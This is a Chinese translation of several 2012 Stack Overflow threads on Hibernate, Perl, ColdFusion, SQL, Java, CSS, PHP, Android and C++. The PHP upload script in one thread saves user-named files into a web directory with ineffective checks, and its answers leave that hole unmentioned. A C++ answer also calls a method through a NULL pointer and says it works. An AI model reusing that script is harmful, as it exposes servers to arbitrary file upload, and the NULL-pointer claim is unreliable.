## 回答 #3

> 赞同：1
> 
> 时间：2012-08-26T18:25:58.770

如果它可以帮助某人...

我仍然有一个问题，这次与[此有关：](https://hibernate.onjira.com/browse/HHH-5559)*当被另一个实体替换时，*子实体没有被删除。它仅在设置为 NULL 时被删除。

我现在要使用的解决方法是**强制在 "parent" 中重用相同的实体**。

例如 ：

```
public class User extends BaseModel
{ 
    @OneToOne(cascade=CascadeType.ALL, orphanRemoval=true, fetch=FetchType.LAZY, optional=true)
    private FacebookAccount facebookAccount;

    public void setFacebookAccount(FacebookAccount facebookAccount)
    {
        if(facebookAccount != null && this.facebookAccount != null && (facebookAccount.getId() == 0 || this.facebookAccount.getId() != facebookAccount.getId()))
        {
            throw new OneToOneFixMustReUseExistingEntityException();
        }

        this.facebookAccount = facebookAccount;
    }

} 
```

...其中*OneToOneFixMustReUserExistingEntityException*是自定义异常。

如果我真的需要关联一个*新实例*，我会将当前实例设置为 NULL，保存父实例，然后将其关联到新实例。

我希望此解决方法将始终有效！

# macos - 使用 while 和数组赋值迭代行之间的区别

> ID：12009962
> 
> 赞同：1
> 
> 时间：2012-08-17T16:57:15.900
> 
> 标签：macos, perl, text

我正在编写一个将文件读入数组的 perl 脚本。我在 Windows 上使用 Perl 5.16 编写了程序（它也适用于 5.14），并且使用带有 Perl 5.12 的 Mac 脚本失败了。

失败的部分是这样的：`my @array = <$file>`. 在 Mac 上，数组返回正确的大小（与文件中的行数相同），但除了最后一个元素之外的每个元素都是空的。当我切换到这个代码时，代码可以正常工作：

```
my @array;
while(<$file>){
    push @array, $_;
} 
```

我不确定如果我将行尾切换`LF`为`CRLF`（Windows 风格）是否会有所不同。虽然问题解决了，但让我很困惑。我认为我列出的那两个代码片段**完全相同**。它们有什么区别在这里产生不同的结果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:25:47.983

答案是，正如您所怀疑的，这两种方法是完全等价的。例子：

```
my $start = tell DATA; #store beginning filehandle position

my @array1 = <DATA>;

seek DATA,$start,0; #reset filehandle position

my @array2;
while(<DATA>){
    push @array2,$_;
}

print "List assignment:\n @array1\n";
print "Looping through:\n @array2\n";

__DATA__
1
2
foo
bar 
```

你之前的失败很可能是别的原因。也许涉及 Mac 上的 Perl 或 Mac 的文件 IO 的某种问题，但更有可能是代码的其他部分（我的意思不是个人的：我会对自己的代码做出相同的假设）。

# coldfusion - 使用 cfswitch cfcase 每 3 个月显示一次

> ID：12009965
> 
> 赞同：3
> 
> 时间：2012-08-17T16:57:40.910
> 
> 标签：coldfusion, coldfusion-7

我正在做一个税务项目。税收分为季度。征税的月份是 3 月、6 月、9 月和 12 月。一旦运行我的网站会显示税收何时再次运行。我的问题是，在我的结果页面中，当下一次运行日期是 12 月而不是显示 12-2012 时，我得到的东西看起来像 0-2012。

这是我的代码：

```
<td style="white-space: nowrap;">&nbsp;#stec_mysql_search_results.cover_date#&nbsp;</td>
<td style="white-space: nowrap;">&nbsp;<cfif "" neq stec_mysql_search_results.next_run>0<cfset temp_next_run = stec_mysql_search_results.next_run MOD 4><cfswitch expression="#temp_next_run#">
<cfcase value="1">3</cfcase>
<cfcase value="2">6</cfcase>
<cfcase value="3">9</cfcase>
<cfcase value="4">12</cfcase>
</cfswitch>-<cfif 4 lt stec_mysql_search_results.next_run>#year(now())+1#<cfelse>#year(now())#</cfif></cfif>&nbsp;</td> 
```

这是查看源代码时的输出：

```
<td style="white-space: nowrap;">&nbsp;07-16-2012&nbsp;</td>
<td style="white-space: nowrap;">&nbsp;0-2012&nbsp;</td> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T17:52:50.143

问题的关键是您的代码期望 12 mod 4 给出 4，而它给出 0。

您提供的代码已格式化，几乎没有任何换行符，这是一种愚蠢的代码编写方式，因为它很难维护（在可读性、修改甚至简单的修订比较方面），尤其是在以后的开发人员必须出现并了解正在发生的事情。

确保你使用换行符——尤其是当这意味着修复其他人编写的代码时。如果空格的输出是一个问题，那么理想的解决方案通常是将逻辑放在一个函数中（并使用`output=false`），尽管您也可以使用`<cfsilent>..</cfsilent>`块、适当放置的注释`<!--- --->`和其他方式。

以下是将代码的相关部分翻译成实际可读的内容：

```
<cfif "" neq stec_mysql_search_results.next_run>
    0
    <cfset temp_next_run = stec_mysql_search_results.next_run MOD 4>
        <cfswitch expression="#temp_next_run#">
            <cfcase value="1">3</cfcase>
            <cfcase value="2">6</cfcase>
            <cfcase value="3">9</cfcase>
            <cfcase value="4">12</cfcase>
        </cfswitch>
    -
    <cfif 4 lt stec_mysql_search_results.next_run>
        #year(now())+1#
    <cfelse>
        #year(now())#
    </cfif>
</cfif> 
```

您在结果中看到的`0`是 cfif 中的硬编码。

因为开关没有 0 的情况，所以它没有输出任何东西。

要使现有代码正常工作，只需将 cfcase 的 4 更改为 0。

**但是**，由于这是处理宿舍，我不认为你在计算你的意思。

这是简单地将 cfcase 从 4 更改为 0 会导致...

```
January   = January
February  = February
March     = March
April     = December
May       = January
June      = February
July      = March
August    = December
September = January
October   = February
November  = March
December  = December 
```

当你*可能*想要的是这样的：

```
January   = March
February  = March
March     = March
April     = June
May       = June
June      = June
July      = September
August    = September
September = September
October   = December
November  = December
December  = December 
```

这可以很简单地用`3*ceiling(next_run/3)`.

如果这个假设是正确的，那么有一个更好的方法来编写你的代码：

```
<td>#calculateNextRunQuarter(stec_mysql_search_results.next_run)#</td>

<cffunction name="calculateNextRunQuarter()" returntype="String" output=false>
    <cfargument name="NextRunMonth" type="Numeric" required />

    <cfset var Quarter = 3*ceiling(Arguments.NextRunMonth/3) />
    <cfset var TheYear = Year(Now()) />

    <cfif Arguments.NextRunMonth GTE 4 >
        <cfset TheYear = TheYear + 1 />
    </cfif>

    <cfreturn Right('0'&Quarter,2) & '-' & TheYear />
</cffunction> 
```

而且因为逻辑都在 output=false 的函数中，所以没有杂散的空格，代码仍然完全可读

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T19:50:54.537

cfcase 将接受一个列表，也许你过于复杂了，为什么不这样做：

```
 <cfswitch expression="#stec_mysql_search_results.next_run#">
        <cfcase value="1,2,3">3</cfcase>
        <cfcase value="4,5,6">6</cfcase>
        <cfcase value="7,8,9">9</cfcase>
        <cfcase value="10,11,12">12</cfcase>
    </cfswitch> 
```

# sql-server-2008 - 更新由 pk/fk 连接的两个表

> ID：12009966
> 
> 赞同：0
> 
> 时间：2012-08-17T16:57:44.387
> 
> 标签：sql-server-2008, inner-join

我有两个具有相同 ID 列 PK/FK 的表。我需要用第三个表中的数据更新它们。

```
IF EXISTS (SELECT * C, B WHERE B2 = C4 AND C6 = NULL)
Update A
   Set A2=C2,
       A3=C3,
       B2=C4,
       B3=C5
 From C
 Where C6 = NULL 
```

如何加入连接以将正确的 B 行链接到 A 行？我可以消除最后一个 where 语句，因为它已经受到该标准的限制，对吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-17T17:01:00.547

您不能一次更新两个表，您可以简单地将两个更新语句包装在一个`TRANSACTION`. 中：

```
BEGIN TRANSACTION
--perform a update...
    UPDATE A
    SET 
      A.A2=C.C2,
      A.A3=C.C3
    FROM
    MyTableA A
    INNER JOIN MyTableC C
    ON C.ID = A.ID...
--perform b update
   UPDATE B...
COMMIT 
```

# java - 用循环从句子中附加特定字符

> ID：12009969
> 
> 赞同：0
> 
> 时间：2012-08-17T16:58:00.503
> 
> 标签：java

我想知道是否可以在将辅音附加到 StringBuilder 变量的正确方法上获得一些帮助。

就目前而言，它成功地找到并计算了在一个句子中找到的元音的数量，但是，我在创建一个排除它们的新变量时遇到了麻烦。

```
 char[] vowels = {'a', 'e', 'i', 'o', 'u'};
    int vowelCount = 0;
    String defParagraph = "This is an example sentence.";
    StringBuilder sbParagraph = new StringBuilder(defParagraph);
    StringBuilder vowParagraph = new StringBuilder("");

    System.out.print("Characters: " + sbParagraph.length());

    for (int i = 0; i < sbParagraph.length(); i++) {
        for (int j = 0; j < vowels.length; j++) {
            if (sbParagraph.toString().toLowerCase().charAt(i) == vowels[j]) {
                vowelCount++;
            }
        }
    } 
```

我试过简单地`vowParagraph.append(sbParagraph.charAt(i)`在循环中添加 a ，但它在新字符串中给了我相同字符的倍数。我也考虑过复制原始的 StringBuilder 变量并简单地删除字符，但我根本不知道最好的方法来做到这一点。

我不确定我是否应该坚持使用两个循环和一个数组，或者我是否应该简单地制作一个大量的 if/then 条件来检查值。老实说，这似乎是最简单的方法，但也似乎有点过于冗长和低效。

如果有人可以帮助我阐明我的愚蠢，我将不胜感激。这一直让我发疯。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:31:25.903

这是替代版本，

```
String regex = "[aeiou]";
Matcher m = Pattern.compile(regex,Pattern.CASE_INSENSITIVE).matcher(defParagraph); 
while (m.find()) {
  vowelCount++;
}
String vowParagraph=defParagraph.replaceAll(regex, "").toLowerCase(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T17:05:53.403

您可以像这样更改循环以避免倍数：

```
for (int i = 0; i < sbParagraph.length(); i++) {
    char c = defParagraph.toLowerCase().charAt(i);
    boolean isVowel = false;
    for (int j = 0; j < vowels.length; j++) {
        if (c == vowels[j]) {
            isVowel = true;
            break;
        }
    }
    if (isVowel) {
        vowelCount++;
    } else {
        vowParagraph.append(c);
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T17:38:15.853

你还没有说明你的结果应该是什么？您是否只想计算句子中有多少个元音？或者你想要一个代表唯一元音的字符串？

如果你想要一个包含句子中所有元音的字符串，那么按照你的想法去做。在`for(int j...`循环中附加元音。您看到倍数的原因是句子中有倍数。（2个i，2个a，5个e）。

编辑：我刚刚注意到您的问题表明您“需要帮助附加`consonants`到 StringBuilder”。那你为什么还要关心元音呢？

编辑 2：要仅将辅音附加到 Stringbuilder 试试这个

```
 String defParagraph = "This is an example sentence.";
    StringBuilder sbParagraph = new StringBuilder(defParagraph);
    StringBuilder conPara = new StringBuilder();

    System.out.println("Characters: " + sbParagraph.length());

    for (int i = 0; i < sbParagraph.length(); i++) {
        char c = sbParagraph.toString().toLowerCase().charAt(i);
        if (c == 'a' || c=='e' || c=='i' || c=='o' || c=='u') {
            continue; // Skip this character.
        }
        conPara.append(c);
    }

    System.out.println("conPara: " + conPara); 
```

输出是：

```
 Characters: 28
 conPara: ths s n xmpl sntnc. 
```

由于这是家庭作业，我将留给您弄清楚如何删除空格。（它们既不是元音也不是辅音）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-17T17:46:12.327

如何避免`O(N^2)`循环？

```
Set<Character> vowels = new HashSet<Character>(Arrays.asList('a','e','i','o','u'));  
int vowelCount = 0;
String sbParagraph = "This is an example sentence.";
StringBuilder vowParagraph = new StringBuilder();

System.out.print("Characters: " + sbParagraph.length());

for (int i = 0, len = sbParagraph.length(); i < len; i++) {  
    int theChar = sbParagraph.charAt(i);
    if(vowels.contains(Character.toLowerCase(theChar)){    
        vowelCount++;    
     }  
     else{  
         vowParagraph.append(theChar);
      }  
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-17T19:01:12.073

这与其他一些答案类似，但对为什么对代码进行更改进行了一些调整和解释。不过，附带说明一下，如果您可以选择正则表达式，请查看 Adi 的答案。他为您提供了另一种解决问题的方法，但是由于这是家庭作业，因此不确定它是否是可行的解决方案。无论如何，有解释（跳到最终产品的底部）：

更改您声明开始的内容

```
int vowelCount = 0;
// All the Strings/StringBuilders can be final since we will never reinstantiate them
final String defParagraph = "This is an example sentence.";
// We'll just make a lowercase version here. That way we don't 
// .toLowerCase() everytime though the loop, and for people that complain
// about trying to optimize - I think it's easier to read too.
final String lowerCaseVersion = defParagraph.toLowerCase();
// Declare the stringBuilder with the size of defParagraph. That is the
// maximum size the vowel-less text could be, and ensures the stringBuilder
// won't overflow it's initial capacity and have to waste time growing.
final StringBuilder newParagraph = new StringBuilder(defParagraph.length());
// Not using the vowel array. We will remove the loop 
// and just || them together - see below
//char[] vowels = {'a', 'e', 'i', 'o', 'u'};
// You didn't need sbParagraph for anything you had (defParagraph works fine).
// Also, you could have just been a regular String since you never changed it.
//StringBuilder sbParagraph = new StringBuilder(defParagraph);
// Don't need vowParagraph since we aren't tracking the actual vowels, just the count
//StringBuilder vowParagraph = new StringBuilder(""); 
```

对实际循环的更改

```
 for (int i = 0; i < lowerCaseVersion.length(); i++) {
  // grab the current character
  char tempChar = lowerCaseVersion.charAt(i);
  if ('a' == tempChar || 'e' == tempChar || 'i' == tempChar 
        || 'o' == tempChar || 'u' == tempChar) {
    // It matched one of the vowels, so count it
    vowelCount ++;
  } else {
    // It didn't match a vowel, so add it the consonants stringBuilder
    // Oh, and append a character from the original, not the lowerCaseVersion
    newParagraph.append(defParagraph.charAt(i));
  }
} 
```

然后一起没有评论：

```
int vowelCount = 0;
final String defParagraph = "This is an example sentence.";
final String lowerCaseVersion = defParagraph.toLowerCase();
final StringBuilder newParagraph = new StringBuilder(defParagraph.length());

System.out.println("Characters: " + defParagraph.length());

for (int i = 0; i < lowerCaseVersion.length(); i++) {
  char tempChar = lowerCaseVersion.charAt(i);
  if ('a' == tempChar || 'e' == tempChar || 'i' == tempChar 
        || 'o' == tempChar || 'u' == tempChar) {
    vowelCount ++;
  } else {
    newParagraph.append(defParagraph.charAt(i));
  }
}

System.out.println("\tVowel: " + vowelCount);
System.out.println("\tDefPara: " + defParagraph.toString());
System.out.println("\tNewPara: " + newParagraph.toString()); 
```

输出如下：

```
Characters: 28
  Vowels: 9
  DefPara: This is an example sentence.
  NewPara: Ths s n xmpl sntnc. 
```

* * *

## 笔记

1.  在这种情况下，使用`final`确实是可选的。我倾向于尽可能使用它，但这可能是个人喜好。[这个问题](https://stackoverflow.com/questions/154314)有一些关于何时使用的讨论`final`，可能值得一试。

# c# - 创建树形图？

> ID：12009970
> 
> 赞同：0
> 
> 时间：2012-08-17T16:58:04.433
> 
> 标签：c#, jquery, asp.net, graph, treeview

我正在尝试设计图表。我不确定这种图表的正确术语。它类似于树视图，但嵌套在图形中。

它看起来像这样。

![这就是我正在谈论的图表类型。](../Images/902765e895877d50673a4ba547f0ae73.png)

每种颜色都是不同的层次结构，下一个层次从那里分解。

该信息将从运行当前用于树视图的存储过程的服务器动态加载。
有谁知道创建这个的好方法，或者可能为此创建一个开放图形插件？jQuery、asp.net、c# 都适合我。

# html - 下拉菜单左侧无法解释的边距。

> ID：12009974
> 
> 赞同：1
> 
> 时间：2012-08-17T16:58:21.767
> 
> 标签：html, css

我创建了一个吸盘鱼下拉菜单。[这是我网站的链接](https://dl.dropbox.com/u/14863356/OsmosysV4/index.html)

您可能会注意到，当鼠标悬停在菜单项上时，下拉文本的左侧有一个奇怪的边距。更奇怪的是，我试图[在 jsfiddle 上重新创建相同的错误](http://jsfiddle.net/TJRds/7/)但无法这样做，这让我相信该错误可能与下拉菜单无关。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T17:02:37.047

在您的网站中，边距不是问题，只需应用填充：0；到父 ul 元素

```
#nav ul { 
   ....
   padding: 0; /* or what ever you need */
} 
```

该问题与用户代理（浏览器）预定义样式表有关

W3组织。引用：

> 每个用户代理（UA，通常是“Web 浏览器”或“Web 客户端”）都有一个默认样式表，该样式表以合理（但可以说是平凡）的方式呈现文档

所以这意味着您不能依赖预定义的样式表值。如果在 Firefox 中可以，它可能不在 IE 中（取决于您用于开发的浏览器）。我的建议是在您的样式表顶部（首先在页面中加载）添加一个 reset.css 文件，您可以在 Internet 上找到该文件

示例： http: [//meyerweb.com/eric/tools/css/reset/](http://meyerweb.com/eric/tools/css/reset/)

# php - 上传脚本中未定义的变量

> ID：12009980
> 
> 赞同：0
> 
> 时间：2012-08-17T16:58:46.333
> 
> 标签：php, variables, upload, undefined

我收到以下错误，我不知道为什么。

**注意：未定义索引：在第 3 行的 C:\xampp\htdocs\site\upload.php 中上传**

注意：未定义变量：第 7 行 C:\xampp\htdocs\site\upload.php 中的上传大小

注意：未定义的变量：第 14 行 C:\xampp\htdocs\site\upload.php 中的上传类型

**注意：未定义索引：在第 29 行的 C:\xampp\htdocs\site\upload.php 中上传**

我试图在这篇文章中包含 php 的来源，但不能。这是pastebin的链接：[我的源代码](http://pastebin.com/YASd2GUy)

```
<?php 
 $target = "upload/"; 
 $target = $target . basename( $_FILES['uploaded']['name']) ; 
 $ok=1; 

 //This is our size condition 
 if ($uploaded_size > 350000) 
 { 
 echo "Your file is too large.<br>"; 
 $ok=0; 
 } 

 //This is our limit file type condition 
 if ($uploaded_type =="text/php") 
 { 
 echo "No PHP files<br>"; 
 $ok=0; 
 } 

 //Here we check that $ok was not set to 0 by an error 
 if ($ok==0) 
 { 
 Echo "Sorry your file was not uploaded"; 
 } 

 //If everything is ok we try to upload it 
 else 
 { 
 if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $target)) 
 { 
 echo "The file ". basename( $_FILES['uploadedfile']['name']). " has been uploaded"; 
 } 
 else 
 { 
 echo "Sorry, there was a problem uploading your file."; 
 } 
 } 
 ?> 
```

编辑 1：我从 about.com [about.com获得代码](http://php.about.com/od/advancedphp/ss/php_file_upload_5.htm)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T17:02:30.093

1.) 在您的 $FILES 数组中，没有定义上传的索引。可能是因为`$_FILES`这是第一个。尝试

```
<pre>
print_r($FILES);
print_r($_FILES);
</pre> 
```

看看里面有什么。

2.) ¿您在哪里初始化条件中使用的那些变量？您必须从数组中的文件元素中提取数据并将其分配给变量，然后才能使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:03:29.000

第一条通知告诉你，在这一行：

```
$target = $target . basename( $_FILES['uploaded']['name']) ; 
```

数组中没有“已上传”索引，`$_FILES`因为没有文件以名为“已上传”的文件输入的表单上传。

下一条通知告诉您，在这一行：

```
if ($uploaded_size > 350000) 
```

`$uploaded_size`您正在访问一个以前从未定义过的名为的变量，那么它怎么可能保存大于 350000 的值呢？

与接下来的两个通知相同的问题。您似乎缺少一些代码，并且正在测试用于处理上传文件的代码，而无需上传文件，或者不使用具有预期的 enctype 和输入名称的表单。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T17:43:43.447

如果您发现 $_FILES 数组不包含对您上传文件的任何引用，请确保您的表单标签包含 enctype="multipart/form-data"。

# android - 通过单击 ImageView 小部件从 Listview 中删除项目

> ID：12009983
> 
> 赞同：0
> 
> 时间：2012-08-17T16:58:55.963
> 
> 标签：android, listview, position, adapter

我正在尝试通过单击图片 (imageView) 从 ListView 中删除一个项目。我必须这样做，我已经设法通过单击项目本身来做到这一点，但对于这个项目，我不允许这样做。

我的适配器扩展了 BaseAdapter，我的 TaskListItem 扩展了相对布局我使用的是自定义布局 xml。

```
protected void onFinishInflate() {
    super.onFinishInflate();
    textV = (TextView)findViewById(R.id.textViewTask);
    textP = ((TextView)findViewById(R.id.textPriority));
    textR = ((TextView)findViewById(R.id.textResponsible));

    imageD = ((ImageView)findViewById(R.id.imageDeleteTask));
    imageD.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            deleteTask();
            }
        });
    } 
```

和`deleteTask()`方法：

```
protected void deleteTask() {
//MainActivity.adapter.clear(position)
Toast.makeText(getContext(), "Task Deleted", Toast.LENGTH_SHORT).show();
MainActivity.adapter.notifyDataSetChanged();    
    } 
```

我的问题是可变位置。我找不到获取所选项目位置的方法（通过单击 imageView 小部件）。

最后，这是我的适配器代码。任何帮助都感激不尽：

```
public class TaskListAdapter extends BaseAdapter {

private ArrayList<Task> tasks;
private Context context;

public TaskListAdapter(ArrayList<Task> tasks, Context context) {
    super();
    this.tasks = tasks;
    this.context = context;
}

@Override
public int getCount() {
        return tasks.size();
}

@Override
public Task getItem(int position) {
    return (null==tasks)? null: tasks.get(position);
}

@Override
public long getItemId(int position) {
    return position;
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {
         TaskListItem tli;
        Log.v("test","dasfsd");
    if (null == convertView) {
        tli = (TaskListItem)View.inflate(context, R.layout.task_list_item, null);

    }
        else {
        tli = (TaskListItem)convertView;
        }
    tli.setTask(tasks.get(position));
    return tli;
    }

public void forceReload() {
    notifyDataSetChanged();
}

public void clear(int position) {

    tasks.remove(position);

} 
```

更新 ImageView 上 OnClickListener 的代码

```
 public void setTask(final Task task) {
    this.task = task;
    //textV.set(task.isComplete());
    textV.setText(task.getName());
    textP.setText(task.getPriority());
    textR.setText(task.getResponsible());
    imageD.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {   
            // probably get position
            // deleteTask();
            MainActivity.adapter.notifyDataSetChanged();

            }
        });
}

protected void deleteTask() {
    int position=0;
    MainActivity.adapter.clear(position);
    Toast.makeText(getContext(), "Task Deleted", Toast.LENGTH_SHORT).show();
    MainActivity.adapter.notifyDataSetChanged();

    //testing  - problem cannot delete item. 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T18:13:25.753

要获取位置，请将位置添加为视图标签

```
@Override
public View getView(int position, View convertView, ViewGroup parent) {
         TaskListItem tli;
        Log.v("test","dasfsd");
    if (null == convertView) {
        tli = (TaskListItem)View.inflate(context, R.layout.task_list_item, null);

    }else {
        tli = (TaskListItem)convertView;
    }
    tli.setTask(tasks.get(position)  , position);
    return tli;
}

public void setTask(final Task task , int position) {
    this.task = task;
    //textV.set(task.isComplete());
    textV.setText(task.getName());
    textP.setText(task.getPriority());
    textR.setText(task.getResponsible());
    imageD.setTag(new Integer(position));
    imageD.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {   
             int position = (Integer) v.getTag();
             deleteTask(position);
             MainActivity.adapter.notifyDataSetChanged();

            }
        });
}

protected void deleteTask(int position) {
    MainActivity.adapter.clear(position);
    Toast.makeText(getContext(), "Task Deleted", Toast.LENGTH_SHORT).show();
    MainActivity.adapter.notifyDataSetChanged();

    //testing  - problem cannot delete item. 
} 
```

# c++ - 内存分割

> ID：12009994
> 
> 赞同：-4
> 
> 时间：2012-08-17T16:59:38.877
> 
> 标签：c++, oop, class, object

我在一次采访中被问到这些问题。

1.  为什么二进制代码和数据完全分开，即为什么他们计划数据段，为什么不是代码段内的所有内容？

2.

```
class A
{
private :
    int i;
public:
    void show()
    {
        printf("hello");
    }
};
int main()
{
    A* a = NULL; (what happens in object table?)
        A* aa =  new A();  (what happens in object table?)

        a->show();
    aa->show();

    delete aa;
    return 0;
} 
```

aa 和 a 到底有什么不同以及对象在内存中的行为如何。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:13:17.420

### 代码段与数据段

代码段是只读的，而数据段是读/写的，如果将这两个部分混合在一起，在保持代码安全的同时更新数据成为一个挑战：一个例子是 Lol4t0 指出的：

> 对于操作系统的内存管理，代码段将被换出到文件系统上的原始可执行文件，而被认为发生变化的数据段被换出到页面文件。如果将它们混合在一起，您可能会失去将可执行文件作为分页文件重用的优势。

而且，代码段通常加载到只读的内存页面[（VirtualAlloc（PAGE_READONLY）](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx)）

### a（空）与 aa（非空）

a 和 aa 本身只是 A* 类型的堆栈变量，但 a 指向 NULL，而 aa 指向在堆中分配的对象。

a->show() 被翻译成：

```
A_show(a)
//which is:
A_show(NULL) 
```

因为在 show() 中没有引用成员变量，所以应该可以正常工作。

aa->show() 被翻译成：

```
A_show(aa) 
```

这里 aa 是一个有效的地址，所以即使你在 show() 中引用成员变量，它也可以工作。

请注意，与在运行时解析的虚函数不同，因此在每个对象中都需要一个 vptr，成员函数只是普通函数，它以*this*作为第一个参数，并在编译时由编译器解析。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T17:44:14.750

分离代码和数据的另一个原因是内存管理。

当您的物理内存不足时，您可以“忘记”代码页并在需要时从磁盘重新读取它。但是你不能对数据做同样的事情。在这种情况下，您应该将页面移动到交换/页面文件。现在，如果您有混合的代码和数据页面，则必须将它们保存在交换/页面中，因此这种策略可以节省资源。

[好吧，我不假装完整。]

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T17:52:17.910

我想第二部分是一个有点技巧的问题。你会认为会发生分段错误，但由于`A::show`不引用类的任何数据部分，它将被优化为二进制代码的一部分（几乎就像一个静态方法），你会得到“hellohello”。只需将 printf 更改为`printf("hello %d ", i);`，您就会得到分段错误。

# android - 将数据传递给活动

> ID：12009997
> 
> 赞同：1
> 
> 时间：2012-08-17T16:59:53.933
> 
> 标签：android, android-intent

我正在开发一个应用程序，当我按下按钮时，它会下载 XML 文件，将 xml 数据放入自定义对象并将其传递给第二个活动。
问题是出了点问题：当调用该`startActivity()`函数时，应用程序崩溃并出现运行时错误。我的代码是：

```
public void onClickBtn1(View view)
{
    final ProgressDialog dlg = ProgressDialog.show( this, "Data wait", "Waiting data from the site ..");

    // Thread to wait data
    Thread th = new Thread() {

        public void run() {

            // Download and parse xml data
            final DatiSport dati = new DatiSport();
            boolean ret = dati.download();
            dlg.dismiss();

            // check result
            if (ret==true)
            {
                // -- Ok
                handlerUI.post( new Runnable() {

                    public void run() {
                        Intent intSec = new Intent(AICSActivity.this, SportActivity.class);
                        intSec.putExtra("datiSport", dati);
                        startActivity(intSec);
                    }
                });
            }
            else
            { 
```

`startActivity()`应用程序在通话时崩溃。当我断线时，`startActivity()`我无法查看名为“dati”的变量，我猜这定义不明确。
如果我用 12345 代替 dati，就没有问题。

数据的问题是什么？

* * *

--- 此处更改，因为我无法回复自己 ---

好了朋友们。感谢您的回复！
我的猜测是我需要重新设计应用程序数据。

我的第一次尝试是：下载 XML 文本并将数据放入（相当）复杂的对象中。这个对象包含一个冠军列表，每个冠军都包含一个类别列表，每个类别都包含一个团队列表。

问题是，由于 Serializable 不起作用，Parcelable 的实现过于复杂，它应该生成与 xml 文件几乎相同的数据。
我想知道直接将xml文本传递给其他活动是否应该更容易（他们必须依次显示冠军列表，然后是所选冠军的类别，然后是所选类别的球队列表......）

还有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:24:32.210

[从这个答案中提取：](https://stackoverflow.com/a/3323554/582571)

**`Serializable`**是一个标准的Java接口。您只需通过实现接口标记一个类 Serializable，Java 会在某些情况下自动序列化它。

**`Parcelable`**是您自己实现序列化的 Android 特定接口。它的创建比 Serializable 更有效，并解决了默认 Java 序列化方案的一些问题。

[从这个答案中提取](https://stackoverflow.com/a/5551155/582571)：

> 看到 Parcelable 可能会引发一个问题，为什么 Android 不使用内置的 Java 序列化机制？事实证明，Android 团队得出的结论是，Java 中的序列化速度太慢，无法满足 Android 的进程间通信要求。因此，该团队构建了 Parcelable 解决方案。Parcelable 方法要求您显式序列化类的成员，但最终，您可以更快地序列化对象。

在 StackOverFlow 上看到一些答案后，我得出结论 Parcelable 比 android 中的序列化进行了优化。

如何使类到 Parcelable ？（看看[这个](http://prasanta-paul.blogspot.in/2010/06/android-parcelable-example.html)，[这个](http://techdroid.kbeanie.com/2010/06/parcelable-how-to-do-that-in-android.html)和[这个](http://blog.cluepusher.dk/2009/10/28/writing-parcelable-classes-for-android/)教程）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-20T20:23:19.523

我发现问题了！！！
内部类没有实现可序列化！
在转储窗口中，我看到了内部对象“ioe”，它表示存在 NotSerializable 错误和类的名称！！
现在我检查了每个内部类并将数据传递给下一个活动。

非常感谢

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T17:05:13.113

传递对象时使用 Serializable 或 Parcelable

您需要一个类来实现 Serializable 类

```
//to pass :
intent.putExtra("MyClass", obj);  

// to retrieve object in second Activity
getIntent().getSerializableExtra("MyClass"); 
```

你的课看起来像这样；

```
import java.io.Serializable;

@SuppressWarnings("serial") //with this annotation we are going to hide compiler warning
public class MyClass implements Serializable {

public Deneme(Object obj){
    this.obj= obj;
}
private Object obj;

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T17:13:22.567

Intent 类有一个方法为

```
putExtra(String name, int value) 
```

这就是为什么当您将 12345 放在“值”位置时它可以工作的原因，但是 putExtra 没有采用“DatiSport”对象的重载版本。您必须确保“DatiSport”是可序列化或可打包的。

有关更多信息，请参见下文 -

[http://developer.android.com/reference/android/content/Intent.html#putExtra%28java.lang.String,%20java.io.Serializable%29](http://developer.android.com/reference/android/content/Intent.html#putExtra%28java.lang.String,%20java.io.Serializable%29)

[如何使用 Intents 将对象从一个 Android Activity 发送到另一个？](https://stackoverflow.com/questions/2139134/how-to-send-an-object-from-one-android-activity-to-another-using-intents)

[如何在Android上将对象从一个活动传递到另一个活动](https://stackoverflow.com/questions/2736389/how-to-pass-object-from-one-activity-to-another-in-android)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-17T17:23:54.310

让你的类实现**Serializable**接口，然后在*intent extra*中传递对象实例。

要将**数据**从一个 Activity 传递到另一个：

```
intent.putExtra("ClassName", obj); 
```

要从第一个活动中**检索第二个活动中的数据：**

```
getIntent().getSerializableExtra("ClassName"); 
```

# c# - IMetroMode::IsLauncherVisible 在 C# 中通过 pInvoke？

> ID：12009999
> 
> 赞同：2
> 
> 时间：2012-08-17T17:00:05.730
> 
> 标签：c#, windows-8, pinvoke

在 Windows 8 的 C# 中，如何 pInvoke IMetroMode::IsLauncherVisible 方法？

该方法的详细信息可在此处找到：http: [//msdn.microsoft.com/en-us/library/windows/desktop/hh404166 (v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/hh404166(v=vs.85).aspx)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T17:57:11.290

